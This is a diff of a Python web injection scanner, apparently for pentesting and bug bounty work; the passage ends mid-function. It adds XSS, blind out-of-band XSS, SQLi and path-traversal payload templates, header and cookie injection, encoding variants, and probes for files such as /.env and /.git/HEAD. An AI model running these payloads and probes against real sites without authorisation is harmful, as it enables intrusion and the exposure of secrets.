@@ -1,6 +1,10 @@
 #!/usr/bin/env python3
 
-
+# main.py
+# Ultimate legal payload testing tool (Termux-friendly)
+# Features: GET/POST/JSON, header/cookie injection, header template file, JSON auto-discovery probe,
+# blind/OOB support, Playwright optional DOM verification, misconfig/outdated checks, Markdown POC report,
+# robust error handling, colorized terminal output. Requires --confirm I_HAVE_AUTH.
 
 from __future__ import annotations
 import argparse
@@ -19,12 +23,13 @@ import time
 import traceback
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Dict, List, Optional, Set, Tuple
-from urllib.parse import parse_qs, quote_plus, urlencode, urlparse, urlunparse
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, quote_plus
 
+# third-party libs
 try:
     import requests
 except Exception:
-    print("Missing dependency 'requests'. Install with: pip install requests")
+    print("Install dependency: pip install requests")
     sys.exit(1)
 
 try:
@@ -33,16 +38,14 @@ try:
 except Exception:
     BS4_AVAILABLE = False
 
-# Optional Playwright for desktop/VM only
+# Optional Playwright (desktop/VM)
 try:
     from playwright.sync_api import sync_playwright
     PLAYWRIGHT_AVAILABLE = True
 except Exception:
     PLAYWRIGHT_AVAILABLE = False
 
-# ----------------------
-# Banner (user-provided ASCII, raw string safe)
-# ----------------------
+# ---------------- Banner & Colors ----------------
 BANNER = r"""
 __________   _____  _____.___..____     ________      _____   ________    
 \______   \ /  _  \ \__  |   ||    |    \_____  \    /  _  \  \______ \   
@@ -58,49 +61,41 @@ __________   _____  _____.___..____     ________      _____   ________
 \____|__  / \___  >\___  >\____ | |____/ \___  >                          
         \/      \/     \/      \/            \/                           
       Made By : c4h-m in github .com
-      This tool is made for pentesting and bug bounty hunting any misusr i am not responsable
 """
 
-# ----------------------
-# ANSI color helpers (works in Termux & most terminals)
-# ----------------------
 CSI = "\033["
 RESET = CSI + "0m"
-COLORS = {
-    "red": CSI + "31m",
-    "green": CSI + "32m",
-    "yellow": CSI + "33m",
-    "blue": CSI + "34m",
-    "magenta": CSI + "35m",
-    "cyan": CSI + "36m",
-    "white": CSI + "37m",
-    "light_blue": CSI + "94m",
+COL = {
+    "red": CSI + "31m", "green": CSI + "32m", "yellow": CSI + "33m",
+    "blue": CSI + "34m", "magenta": CSI + "35m", "cyan": CSI + "36m",
+    "white": CSI + "37m", "light_blue": CSI + "94m"
 }
 
-def color_text(text: str, color: str) -> str:
-    return (COLORS.get(color, "") + text + RESET)
+def color(text: str, colname: str) -> str:
+    return COL.get(colname, "") + str(text) + RESET
 
-# ----------------------
-# Logging setup (file + console)
-# ----------------------
-LOG_FILE = "xinjection_final.log"
+def color_status(code: Optional[int]) -> str:
+    if code is None: return color("ERR", "magenta")
+    if 200 <= code < 300: return color(str(code), "light_blue")
+    if 300 <= code < 400: return color(str(code), "cyan")
+    if 400 <= code < 500: return color(str(code), "red")
+    if 500 <= code < 600: return color(str(code), "magenta")
+    return color(str(code), "white")
+
+# ---------------- Logging ----------------
+LOG_FILE = "xinjection_ultimate.log"
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[
-        logging.FileHandler(LOG_FILE, encoding="utf-8"),
-        logging.StreamHandler(sys.stdout)
-    ]
+    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler(sys.stdout)]
 )
 
-# ----------------------
-# Defaults and globals
-# ----------------------
+# ---------------- Defaults & Globals ----------------
 USER_AGENT_POOL = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15",
     "curl/7.79.1",
-    "xinjection-final/1.0"
+    "xinjection-ultimate/1.0"
 ]
 
 COMMON_PARAMS = ["q", "s", "search", "id", "page", "term", "query", "text", "input", "name", "url"]
@@ -109,22 +104,20 @@ DEFAULT_DELAY = 0.12
 DEFAULT_JITTER = 0.25
 DEFAULT_TIMEOUT = 10
 MAX_RETRIES = 3
-MAX_BACKOFF = 25.0
+MAX_BACKOFF = 30.0
 
 lock = threading.Lock()
 SHUTDOWN = False
 
-def handle_shutdown(signum, frame):
+def handle_signals(sig, frame):
     global SHUTDOWN
     SHUTDOWN = True
-    logging.warning("Shutdown signal received — finishing in-flight tasks.")
-signal.signal(signal.SIGINT, handle_shutdown)
-signal.signal(signal.SIGTERM, handle_shutdown)
+    logging.warning("Shutdown signal received — finishing in-flight tasks...")
+signal.signal(signal.SIGINT, handle_signals)
+signal.signal(signal.SIGTERM, handle_signals)
 
-# ----------------------
-# Utility functions
-# ----------------------
-def rand_token(prefix: str = "xinj", length: int = 8) -> str:
+# ---------------- Utilities ----------------
+def rand_token(prefix="xinj", length=8) -> str:
     return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"
 
 def atomic_write(path: str, data: str):
@@ -134,7 +127,7 @@ def atomic_write(path: str, data: str):
             f.write(data)
         os.replace(tmp, path)
     except Exception:
-        logging.exception("atomic_write failed; falling back to normal write")
+        logging.exception("atomic_write fallback")
         with open(path, "w", encoding="utf-8") as f:
             f.write(data)
 
@@ -142,41 +135,47 @@ def load_lines(path: str) -> List[str]:
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
         return [line.strip() for line in f if line.strip()]
 
-# ----------------------
-# Payload generation and variants (safe, tokenized)
-# ----------------------
-def generate_payload_templates(kind: str, count: int = 6, oob_domain: Optional[str] = None) -> List[str]:
+# ---------------- Payload templates & variants ----------------
+def gen_templates(kind: str, count: int = 6, oob_domain: Optional[str] = None) -> List[str]:
     templates: List[str] = []
     if kind == "xss_harmless":
-        for _ in range(count):
-            templates.append("<script>console.log('{token}')</script>")
-        templates.append("<img src=x onerror=\"console.log('{token}')\">")
-        templates.append("<svg onload=\"console.log('{token}')\"></svg>")
+        templates = [
+            "<script>console.log('{token}')</script>",
+            "<img src=x onerror=\"console.log('{token}')\">",
+            "<svg onload=\"console.log('{token}')\"></svg>"
+        ]
         if oob_domain:
-            # harmless external reference that allows OOB detection if you control the domain
-            templates.append(f"<img src='https://{oob_domain}/{{token}}' />")
+            templates.append(f"<img src='https://{oob_domain}/{{token}}.png'/>")
     elif kind == "xss_basic":
-        templates = ["<script>alert('{token}')</script>", "<img src=x onerror=alert('x')>"][:count]
+        templates = ["<script>alert('{token}')</script>", "<img src=x onerror=alert('{token}')>"]
+    elif kind == "xss_blind":
+        if not oob_domain:
+            raise ValueError("xss_blind requires --oob-domain")
+        templates = [
+            f"<img src='https://{oob_domain}/x/{{token}}.png'/>",
+            f"<script src='https://{oob_domain}/s/{{token}}.js'></script>",
+            f"<iframe src='https://{oob_domain}/i/{{token}}'></iframe>"
+        ]
     elif kind == "sqli_test":
-        templates = ["' OR '1'='1' -- ", "' UNION SELECT NULL -- "][:count]
+        templates = ["' OR '1'='1' -- ", "' UNION SELECT NULL -- "]
     elif kind == "lfi_test":
-        templates = ["../../etc/passwd", "/etc/passwd", "../../windows/win.ini"][:count]
+        templates = ["../../etc/passwd", "/etc/passwd"]
+    elif kind == "random_tokens":
+        templates = ["{token}"]
     else:
-        for _ in range(count):
-            templates.append("{token}")
+        templates = ["{token}"]
+    # expand to count
+    while len(templates) < count:
+        templates.append(templates[-1])
     # dedupe
-    seen = set()
-    out = []
-    for t in templates:
+    out, seen = [], set()
+    for t in templates[:count]:
         if t not in seen:
             out.append(t); seen.add(t)
     return out
 
-def generate_variants_from_template(template: str, token: Optional[str] = None) -> List[Dict]:
-    """
-    Create safe variants: original (token replaced), url_encoded, double_url, html_escaped, js_escaped.
-    Returns list of dicts: {"type": "...", "payload": "..."}
-    """
+def build_variants(template: str, token: Optional[str] = None) -> List[Dict]:
+    # returns list of {"type":..., "payload": ...}
     if token is None:
         token = rand_token()
     try:
@@ -185,331 +184,386 @@ def generate_variants_from_template(template: str, token: Optional[str] = None) 
         base = template + token
     variants = []
     try:
-        variants.append({"type": "original", "payload": base})
-        variants.append({"type": "url_encoded", "payload": quote_plus(base, safe='')})
-        variants.append({"type": "double_url", "payload": quote_plus(quote_plus(base, safe=''), safe='')})
-        variants.append({"type": "html_escaped", "payload": html.escape(base)})
-        js_escaped = base.replace("'", "\\'").replace('"', '\\"')
-        variants.append({"type": "js_escaped", "payload": js_escaped})
+        variants = [
+            {"type": "original", "payload": base},
+            {"type": "url_encoded", "payload": quote_plus(base, safe='')},
+            {"type": "double_url", "payload": quote_plus(quote_plus(base, safe=''), safe='')},
+            {"type": "html_escaped", "payload": html.escape(base)},
+            {"type": "js_escaped", "payload": base.replace("'", "\\'").replace('"', '\\"')},
+            {"type": "json_escaped", "payload": base.replace("\n", "\\n").replace('"', '\\"')}
+        ]
     except Exception:
-        # fallback
         variants = [{"type": "original", "payload": base}]
-    # dedupe preserving order
-    seen = set()
-    uniq = []
+    # dedupe
+    seen, out = set(), []
     for v in variants:
         if v["payload"] not in seen:
-            uniq.append(v); seen.add(v["payload"])
-    return uniq
+            out.append(v); seen.add(v["payload"])
+    return out
 
-# ----------------------
-# Parameter discovery & light scoring
-# ----------------------
-def quick_fetch(url: str, timeout: int = 5) -> Tuple[Optional[int], str]:
-    # light fetch; don't crash on exceptions
+# ---------------- Parameter discovery & JSON probe ----------------
+def quick_fetch(url: str, timeout: int = 6) -> Tuple[Optional[int], str, Dict]:
     try:
-        resp = requests.get(url, headers={"User-Agent": random.choice(USER_AGENT_POOL)}, timeout=timeout)
-        return resp.status_code, resp.text or ""
+        r = requests.get(url, headers={"User-Agent": random.choice(USER_AGENT_POOL)}, timeout=timeout)
+        return r.status_code, r.text or "", dict(r.headers)
     except Exception:
-        return None, ""
+        return None, "", {}
 
 def discover_params(url: str, timeout: int = 5) -> List[str]:
     parsed = urlparse(url)
-    params = []
-    if parsed.query:
-        params.extend(list(parse_qs(parsed.query).keys()))
-    # attempt to parse HTML forms if bs4 available
-    if BS4_AVAILABLE:
+    params = list(parse_qs(parsed.query).keys())
+    if not params and BS4_AVAILABLE:
         try:
-            status, text = quick_fetch(url, timeout)
+            _, text, _ = quick_fetch(url, timeout=timeout)
             if text:
                 soup = BeautifulSoup(text, "html.parser")
                 for form in soup.find_all("form"):
                     for inp in form.find_all(["input", "textarea", "select"]):
-                        name = inp.get("name")
-                        if name:
-                            params.append(name)
+                        n = inp.get("name")
+                        if n and n not in params:
+                            params.append(n)
         except Exception:
             pass
-    # fallback to common params
     if not params:
         params = COMMON_PARAMS.copy()
-    # unique preserve order
-    return [p for i, p in enumerate(params) if p and p not in params[:i]]
+    # dedupe
+    return [p for i,p in enumerate(params) if p and p not in params[:i]]
 
-# ----------------------
-# Robust GET with retries/backoff (legal, polite)
-# ----------------------
-def robust_get(session: requests.Session, url: str, headers: Dict = None, cookies: Dict = None,
-               timeout: int = DEFAULT_TIMEOUT, max_retries: int = MAX_RETRIES) -> Dict:
+def json_discovery_probe(url: str, session: requests.Session, timeout: int = 6) -> bool:
+    """
+    Safe probe (opt-in): send a tiny JSON POST {"__xinj_probe": "ping"} to check if target accepts JSON.
+    This should be run only when user explicitly enables --probe-json.
+    """
+    try:
+        r = session.post(url, json={"__xinj_probe":"ping"}, timeout=timeout)
+        ct = r.headers.get("Content-Type","")
+        if r.status_code in (200,201) or "application/json" in ct:
+            return True
+    except Exception:
+        pass
+    return False
+
+# ---------------- Robust request engine ----------------
+def robust_request(session: requests.Session, method: str, url: str, headers: Dict = None, cookies: Dict = None,
+                   data=None, json_body=None, timeout: int = DEFAULT_TIMEOUT) -> Dict:
     attempt = 0
     backoff = 1.0
-    while attempt <= max_retries and not SHUTDOWN:
+    while attempt <= MAX_RETRIES and not SHUTDOWN:
         try:
-            r = session.get(url, headers=headers or {}, cookies=cookies or {}, timeout=timeout, allow_redirects=True)
+            if method.upper() == "GET":
+                r = session.get(url, headers=headers or {}, cookies=cookies or {}, timeout=timeout, allow_redirects=True)
+            else:
+                if json_body is not None:
+                    r = session.post(url, headers=headers or {}, cookies=cookies or {}, json=json_body, timeout=timeout, allow_redirects=True)
+                else:
+                    r = session.post(url, headers=headers or {}, cookies=cookies or {}, data=data, timeout=timeout, allow_redirects=True)
             status = r.status_code
             text = r.text or ""
             if status in (429, 502, 503, 504):
-                # transient server condition; retry politely
-                logging.debug(f"Transient HTTP {status} for {url} (attempt {attempt})")
+                logging.debug(f"Transient {status} for {url} (attempt {attempt}) retrying...")
                 attempt += 1
                 time.sleep(backoff)
                 backoff = min(MAX_BACKOFF, backoff * 2)
                 continue
-            return {"status": status, "text": text}
-        except requests.exceptions.Timeout as e:
-            logging.debug(f"Timeout {e} for {url} (attempt {attempt})")
+            return {"status": status, "text": text, "headers": dict(r.headers)}
+        except requests.exceptions.Timeout:
             attempt += 1
             time.sleep(backoff)
             backoff = min(MAX_BACKOFF, backoff * 2)
             continue
         except requests.exceptions.RequestException as e:
-            logging.debug(f"RequestException {e} for {url} (attempt {attempt})")
             attempt += 1
             time.sleep(backoff)
             backoff = min(MAX_BACKOFF, backoff * 2)
             continue
         except Exception as e:
-            logging.exception(f"Unexpected error during GET {url}: {e}")
+            logging.exception(f"Unexpected request error: {e}")
             return {"status": None, "text": "", "error": str(e)}
-    return {"status": None, "text": "", "error": f"max_retries_{max_retries}"}
+    return {"status": None, "text": "", "error": "max_retries_exceeded"}
 
-# ----------------------
-# Playwright JS check (desktop only)
-# ----------------------
-def playwright_check(url: str, tokens: List[str], timeout: int = 8) -> Dict:
-    res = {"playwright": False, "console": [], "posts": [], "found_tokens": []}
+# ---------------- Playwright JS/DOM check (optional desktop) ----------------
+def playwright_check(url: str, tokens: List[str], timeout:int = 8) -> Dict:
+    result = {"playwright": False, "console": [], "posts": [], "found_tokens": []}
     if not PLAYWRIGHT_AVAILABLE:
-        res["error"] = "playwright_not_installed"
-        return res
+        result["error"] = "playwright_not_installed"
+        return result
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=True)
             context = browser.new_context(ignore_https_errors=True)
             page = context.new_page()
             console_msgs = []
-            def on_console(msg):
-                try:
-                    console_msgs.append(f"{msg.type}: {msg.text}")
-                except Exception:
-                    pass
             posts = []
+            page.on("console", lambda msg: console_msgs.append(f"{msg.type}: {msg.text}"))
             def on_request(req):
                 try:
                     if req.method == "POST":
                         posts.append({"url": req.url, "post_data": req.post_data})
                 except Exception:
                     pass
-            page.on("console", on_console)
             page.on("request", on_request)
             page.goto(url, timeout=timeout*1000)
             time.sleep(1.0)
             browser.close()
-            res.update({"playwright": True, "console": console_msgs, "posts": posts})
-            for tkn in tokens:
+            result.update({"playwright": True, "console": console_msgs, "posts": posts})
+            for t in tokens:
                 for c in console_msgs:
-                    if tkn in c:
-                        res["found_tokens"].append({"token": tkn, "via": "console", "msg": c})
+                    if t in c:
+                        result["found_tokens"].append({"token": t, "via": "console", "msg": c})
                 for p_ in posts:
-                    if tkn in (p_.get("post_data") or "") or tkn in (p_.get("url") or ""):
-                        res["found_tokens"].append({"token": tkn, "via": "post", "post": p_})
+                    if t in (p_.get("post_data") or "") or t in (p_.get("url") or ""):
+                        result["found_tokens"].append({"token": t, "via": "post", "post": p_})
     except Exception as e:
-        logging.exception(f"Playwright check error for {url}: {e}")
-        res["error"] = str(e)
-    return res
+        logging.exception(f"Playwright check failed: {e}")
+        result["error"] = str(e)
+    return result
 
-# ----------------------
-# Terminal output helpers (compact, colored)
-# ----------------------
-def status_color_for_code(code: Optional[int]) -> str:
-    if code is None:
-        return "magenta"
-    if 200 <= code < 300:
-        return "light_blue"
-    if 300 <= code < 400:
-        return "cyan"
-    if 400 <= code < 500:
-        return "red"
-    if 500 <= code < 600:
-        return "magenta"
-    return "white"
-
-def print_result_brief(entry: Dict):
-    # entry: target, injection_url, status, success (bool), reasons, snippet
-    status = entry.get("status")
-    code_text = str(status) if status is not None else "ERR"
-    color = status_color_for_code(status)
-    prefix = "[✓]" if entry.get("success") else "[.]"
-    if entry.get("success"):
-        prefix = color_text("[SUCCESS]", "green")
-    msg = f"{prefix} {code_text} {entry.get('injection_url')}"
-
-    # if success or notable reason, color and show reasons
-    reasons = entry.get("reasons") or entry.get("confidence") or []
-    reason_str = ""
-    if entry.get("success") and entry.get("reasons"):
-        reason_str = " | " + ",".join(entry.get("reasons"))
-    print(color_text(msg + reason_str, color))
-
-# ----------------------
-# Core worker (thread-safe, dedup)
-# ----------------------
-class PerTargetControl:
+# ---------------- Per-target pacer & dedupe ----------------
+class Pacer:
     def __init__(self):
         self.lock = threading.Lock()
-        self.last_request_time: Dict[str, float] = {}
-        self.consecutive_block: Dict[str, int] = {}
-
-    def wait_min_interval(self, target: str, min_interval: float):
+        self.last: Dict[str, float] = {}
+        self.blocks: Dict[str, int] = {}
+    def wait(self, host: str, min_interval: float):
         with self.lock:
-            last = self.last_request_time.get(target, 0.0)
-            now = time.time()
+            now = time.time(); last = self.last.get(host, 0.0)
             sleep_for = max(0.0, min_interval - (now - last))
-            if sleep_for > 0:
-                logging.debug(f"Per-target wait {sleep_for:.2f}s for {target}")
-                time.sleep(sleep_for)
-
-    def record_request(self, target: str):
+        if sleep_for > 0:
+            time.sleep(sleep_for)
+    def mark(self, host: str):
         with self.lock:
-            self.last_request_time[target] = time.time()
-
-    def inc_block(self, target: str):
+            self.last[host] = time.time()
+    def add_block(self, host: str):
         with self.lock:
-            self.consecutive_block[target] = self.consecutive_block.get(target, 0) + 1
-
-    def reset_block(self, target: str):
+            self.blocks[host] = self.blocks.get(host, 0) + 1
+    def reset(self, host: str):
         with self.lock:
-            self.consecutive_block[target] = 0
-
-    def get_block(self, target: str) -> int:
+            self.blocks[host] = 0
+    def blocks_count(self, host: str) -> int:
         with self.lock:
-            return self.consecutive_block.get(target, 0)
+            return self.blocks.get(host, 0)
 
-per_target_ctrl = PerTargetControl()
+PACER = Pacer()
 
-def worker_inject(target: str,
-                  payload_template: str,
-                  param_override: Optional[str],
-                  session: requests.Session,
-                  min_interval: float,
-                  delay_base: float,
-                  jitter: float,
-                  timeout: int,
-                  playwright_flag: bool,
-                  oob_domain: Optional[str],
-                  checked_set: Set[Tuple[str, str, str]]) -> List[Dict]:
-    out: List[Dict] = []
+def print_brief(entry: Dict):
+    st = color_status(entry.get("status"))
+    prefix = color("[SUCCESS]", "green") if entry.get("success") else color("[.]", "yellow")
+    reasons = ",".join(entry.get("reasons") or [])
+    msg = f"{prefix} {st} {entry.get('injection_uri')}"
+    if reasons:
+        msg += f" | {reasons}"
+    print(msg)
+
+# ---------------- Header template parsing ----------------
+def parse_header_templates(file_path: str) -> List[Tuple[str, str]]:
+    """
+    File format: one header per line, e.g.
+    User-Agent: MyScanner/{token}
+    X-Forwarded-For: {payload}
+    """
+    out = []
+    try:
+        lines = load_lines(file_path)
+        for ln in lines:
+            if ":" in ln:
+                h, v = ln.split(":", 1)
+                out.append((h.strip(), v.strip()))
+    except Exception:
+        logging.exception("Failed to parse header template file")
+    return out
+
+# ---------------- Misconfig & outdated scanner ----------------
+def misconfig_scan(session: requests.Session, base_url: str, timeout: int = 8) -> Dict:
+    res = {"url": base_url, "security_headers": {}, "sensitive": [], "old_indicators": [], "errors": []}
+    try:
+        parsed = urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        try:
+            r = session.get(origin, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
+            sh = r.headers
+            for h in ["Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy", "Strict-Transport-Security"]:
+                res["security_headers"][h] = sh.get(h)
+            server = (sh.get("Server") or "") + " " + (sh.get("X-Powered-By") or "")
+            if re.search(r"Apache/2\.2|Apache/2\.0", server):
+                res["old_indicators"].append("Apache 2.0/2.2 detected")
+            if re.search(r"OpenSSL/1\.0", server):
+                res["old_indicators"].append("OpenSSL 1.0 detected")
+        except Exception as e:
+            res["errors"].append(f"homepage check failed: {e}")
+        sensitive = ["/robots.txt", "/.git/HEAD", "/.env", "/phpinfo.php", "/wp-config.php", "/backup.zip", "/config.php~"]
+        for p in sensitive:
+            if SHUTDOWN: break
+            url = origin.rstrip("/") + p
+            try:
+                r = session.head(url, allow_redirects=True, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
+                if r.status_code == 200:
+                    res["sensitive"].append({"path": p, "status": r.status_code})
+                elif r.status_code and 300 <= r.status_code < 400:
+                    res["sensitive"].append({"path": p, "status": r.status_code})
+            except Exception:
+                try:
+                    r = session.get(url, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENT_POOL)})
+                    if r.status_code == 200:
+                        res["sensitive"].append({"path": p, "status": r.status_code})
+                except Exception:
+                    pass
+    except Exception as e:
+        logging.exception(f"misconfig_scan error: {e}")
+        res["errors"].append(str(e))
+    return res
+
+# ---------------- Worker (injection across vectors) ----------------
+def worker_task(target: str,
+                template: str,
+                method: str,
+                inject_headers: List[str],
+                header_templates: List[Tuple[str,str]],
+                inject_cookies: bool,
+                json_body_flag: bool,
+                param_override: Optional[str],
+                session: requests.Session,
+                min_interval: float,
+                delay: float,
+                jitter: float,
+                timeout: int,
+                playwright_flag: bool,
+                probe_json: bool,
+                checked: Set[Tuple[str,str,str]]) -> List[Dict]:
+    out = []
     if SHUTDOWN:
         return out
     try:
         parsed = urlparse(target)
-        candidate_params = discover_params(target)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        params = discover_params(target)
         if param_override:
-            candidate_params = [param_override] + [p for p in candidate_params if p != param_override]
-        # Generate a run token and variants
-        run_token = rand_token()
-        variants = generate_variants_from_template(payload_template, token=run_token)
-        # cookie template
-        cookie_key = f"xinj_{random.randint(1000,9999)}"
-        # Respect per-target min interval
-        per_target_ctrl.wait_min_interval(target, min_interval)
-        for p in candidate_params:
+            params = [param_override] + [p for p in params if p != param_override]
+        # optional JSON probe
+        is_json_endpoint = False
+        if probe_json:
+            try:
+                is_json_endpoint = json_discovery_probe(target, session, timeout=timeout)
+            except Exception:
+                is_json_endpoint = False
+        # generate token and variants
+        token = rand_token()
+        variants = build_variants(template, token=token)
+        cookie_name = f"xinj_{random.randint(1000,9999)}"
+        # pacing
+        PACER.wait(origin, min_interval)
+        for p in params:
             if SHUTDOWN:
                 break
             for v in variants:
                 inj_key = (target, p, v["payload"])
                 with lock:
-                    if inj_key in checked_set:
-                        logging.debug(f"Skipping duplicate inj {inj_key}")
+                    if inj_key in checked:
                         continue
-                    checked_set.add(inj_key)
-                # build injection URL
+                    checked.add(inj_key)
+                # build injection URI for logging (query)
                 qs = parse_qs(parsed.query, keep_blank_values=True)
                 qs[p] = [v["payload"]]
-                new_q = urlencode(qs, doseq=True)
-                inj_url = urlunparse(parsed._replace(query=new_q))
-                # polite pacing
-                time.sleep(delay_base + random.random() * jitter)
-                per_target_ctrl.wait_min_interval(target, min_interval)
-                per_target_ctrl.record_request(target)
-                # headers and cookies
-                headers = {
-                    "User-Agent": random.choice(USER_AGENT_POOL),
-                    "Referer": target,
-                    "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9"])
-                }
-                cookies = {cookie_key: run_token}
-                # perform robust GET
-                resp = robust_get(session, inj_url, headers=headers, cookies=cookies, timeout=timeout)
+                inj_uri = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+                # pacing/delay
+                time.sleep(delay + random.random()*jitter)
+                PACER.wait(origin, min_interval)
+                PACER.mark(origin)
+                # build headers
+                headers = {"User-Agent": random.choice(USER_AGENT_POOL), "Referer": target}
+                for hn in inject_headers:
+                    if not hn: continue
+                    headers[hn] = v["payload"]
+                # header templates
+                for (hn, hv_template) in header_templates:
+                    try:
+                        hv = hv_template.replace("{token}", token).replace("{payload}", v["payload"])
+                        headers[hn] = hv
+                    except Exception:
+                        headers[hn] = hv_template
+                # cookies
+                cookies = {cookie_name: v["payload"]} if inject_cookies else {}
+                # body
+                data = None; json_body = None
+                req_url = target
+                if method.upper() == "GET":
+                    req_url = inj_uri
+                else:
+                    req_url = urlunparse(parsed._replace(query=parsed.query))
+                    if json_body_flag or is_json_endpoint:
+                        # heuristic json field names
+                        json_body = {"input": v["payload"], "q": v["payload"], "token": token}
+                    else:
+                        data = {p: v["payload"]}
+                # perform request
+                resp = robust_request(session, method, req_url, headers=headers, cookies=cookies, data=data, json_body=json_body, timeout=timeout)
                 status = resp.get("status")
-                text = resp.get("text", "") or ""
+                text = resp.get("text", "")
                 success = False
                 reasons = []
-                confidence = 0
+                conf = 0
                 # reflection detection
-                if run_token in text:
-                    success = True
-                    reasons.append("reflection_token")
-                    confidence += 70
-                # server error heuristic
+                if token in text or v["payload"] in text:
+                    success = True; reasons.append("reflection_token"); conf += 70
+                # server errors
                 if status and status >= 500:
-                    reasons.append("server_error")
-                    confidence += 5
-                # OOB reference note
-                if oob_domain and oob_domain in v["payload"]:
+                    reasons.append("server_error"); conf += 5
+                # OOB
+                if "http://" in v["payload"] or "https://" in v["payload"]:
                     reasons.append("oob_reference")
-                # Optional Playwright verification (desktop only)
+                # Playwright verification if available
                 pw_info = None
                 if playwright_flag and PLAYWRIGHT_AVAILABLE and not success:
                     try:
-                        pw_info = playwright_check(inj_url, [run_token], timeout=timeout)
+                        pw_info = playwright_check(req_url, [token], timeout=timeout)
                         if pw_info.get("found_tokens"):
-                            success = True
-                            reasons.append("playwright_exec")
-                            confidence += 30
+                            success = True; reasons.append("playwright_exec"); conf += 30
                     except Exception as e:
-                        logging.debug(f"Playwright exception for {inj_url}: {e}")
-                # adaptive backoff on 403/429
+                        logging.debug(f"Playwright check error for {req_url}: {e}")
+                        pw_info = {"error": str(e)}
+                # adaptive backoff
                 if status in (403, 429):
-                    per_target_ctrl.inc_block(target)
-                    backoff = min(MAX_BACKOFF, 1 + per_target_ctrl.get_block(target) * 2)
-                    logging.warning(f"Target {target} responded {status}. Backing off {backoff}s (polite).")
+                    PACER.add_block(origin)
+                    backoff = min(MAX_BACKOFF, 1 + PACER.blocks_count(origin)*2)
+                    logging.warning(f"{origin} returned {status}; polite backoff {backoff}s")
                     time.sleep(backoff)
                 else:
-                    per_target_ctrl.reset_block(target)
+                    PACER.reset(origin)
                 entry = {
                     "target": target,
                     "injected_param": p,
-                    "variant_type": v["type"],
+                    "method": method.upper(),
+                    "injection_uri": inj_uri,
+                    "payload_variant": v["type"],
                     "payload_preview": v["payload"][:500],
-                    "injection_url": inj_url,
                     "status": status,
                     "success": success,
-                    "confidence": confidence,
+                    "confidence": conf,
                     "reasons": reasons,
-                    "snippet": text[:500]
+                    "snippet": text[:500],
+                    "oob_token": token if "oob_reference" in reasons or "oob" in template.lower() else None
                 }
                 if pw_info is not None:
                     entry["playwright"] = pw_info
                 out.append(entry)
-                # print brief colored result
-                print_result_brief(entry)
-                # if success for this param, break further variants for param
+                print_brief(entry)
                 if success:
                     break
-            # if success occurred for param, skip other params
+            # if success for this param, break to next param
             if any(r["success"] for r in out if r.get("injected_param") == p):
                 break
         return out
     except Exception as e:
-        logging.exception(f"Worker injection unhandled exception for {target}: {e}")
+        logging.exception(f"Worker exception for {target}: {e}")
         return [{"target": target, "error": str(e), "traceback": traceback.format_exc()}]
 
-# ----------------------
-# Orchestration + dedupe
-# ----------------------
+# ---------------- Orchestrator & Outputs & OOB registry & report ----------------
 def orchestrate(targets: List[str],
                 payload_templates: List[str],
+                method: str,
+                inject_headers: List[str],
+                header_templates_file: Optional[str],
+                inject_cookies: bool,
+                json_body_flag: bool,
                 param: Optional[str],
                 threads: int,
                 min_interval: float,
@@ -517,128 +571,201 @@ def orchestrate(targets: List[str],
                 jitter: float,
                 timeout: int,
                 playwright_flag: bool,
-                oob_domain: Optional[str],
+                probe_json: bool,
+                do_scan: bool,
+                out_path: str,
+                out_fmt: str,
                 only_success: bool,
-                output_path: str,
-                output_format: str) -> List[Dict]:
+                generate_report: bool) -> Dict:
     session = requests.Session()
     session.headers.update({"User-Agent": random.choice(USER_AGENT_POOL)})
+    checked: Set[Tuple[str,str,str]] = set()
     results: List[Dict] = []
-    checked_set: Set[Tuple[str, str, str]] = set()
+    scans: Dict[str, Dict] = {}
+    header_templates = parse_header_templates(header_templates_file) if header_templates_file else []
+    oob_registry: List[Dict] = []
     with ThreadPoolExecutor(max_workers=threads) as exe:
         futures = []
         for t in targets:
             for templ in payload_templates:
-                if SHUTDOWN:
-                    break
-                futures.append(exe.submit(worker_inject, t, templ, param, session,
-                                          min_interval, delay, jitter, timeout, playwright_flag, oob_domain, checked_set))
+                if SHUTDOWN: break
+                futures.append(exe.submit(worker_task, t, templ, method, inject_headers, header_templates, inject_cookies,
+                                          json_body_flag, param, session, min_interval, delay, jitter, timeout,
+                                          playwright_flag, probe_json, checked))
+            if do_scan:
+                futures.append(exe.submit(misconfig_scan, session, t, timeout))
         for fut in as_completed(futures):
+            if SHUTDOWN:
+                logging.info("Shutdown requested during orchestrate; collecting available results.")
             try:
-                res_list = fut.result()
-                for entry in res_list:
-                    if only_success and not entry.get("success"):
-                        continue
-                    with lock:
-                        results.append(entry)
-                if SHUTDOWN:
-                    logging.info("Shutdown requested — halting orchestrator collection.")
-                    break
+                res = fut.result()
+                if isinstance(res, list):
+                    for r in res:
+                        if only_success and not r.get("success"):
+                            continue
+                        with lock:
+                            results.append(r)
+                        # track OOB tokens
+                        if r.get("oob_token"):
+                            oob_registry.append({
+                                "target": r.get("target"),
+                                "payload_preview": r.get("payload_preview"),
+                                "token": r.get("oob_token"),
+                                "injection_uri": r.get("injection_uri"),
+                                "time": time.time()
+                            })
+                elif isinstance(res, dict):
+                    scans[res.get("url", f"scan_{len(scans)+1}")] = res
             except Exception as e:
-                logging.exception(f"Orchestrator: worker future exception: {e}")
-    # Save final results
